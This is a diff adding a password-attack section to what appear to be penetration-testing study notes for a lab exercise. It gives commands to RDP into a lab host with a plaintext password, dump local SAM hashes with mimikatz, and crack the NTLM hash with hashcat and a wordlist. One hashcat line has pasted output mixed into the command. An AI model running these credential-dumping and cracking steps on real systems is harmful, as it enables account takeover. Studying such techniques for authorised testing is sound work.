@@ -1492,6 +1492,26 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
      chmod 600 id_rsa
      ssh -i id_rsa -p 2223 alfred@192.168.161.201
      ```
+- 15.3 Password hashed
+  - Cracking NTLM
+    - `xfreerdp3 /u:nadine /p:123abc /v:192.168.139.227 /cert:ignore /drive:share,/home/kali/share`
+    - Run powershell as admin `.\mimikatz.exe`
+    - dump the hash
+      ```
+      privilege::debug
+      token::elevate
+      lsadump::sam
+      ```
+    - Crack the hash in kali
+      ```
+      nano steve.hash 
+      hashcat --help | grep -i "ntlm" > 1000 | NTLM | Operating System
+      hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+      ```
+  - Passing NTLM
+  - Cracking Net-NTLMv2
+  - Relaying Net-NTLMv2
+  - Windows credential guard
 - 16.2.1
 
 ## Penetration testing report 
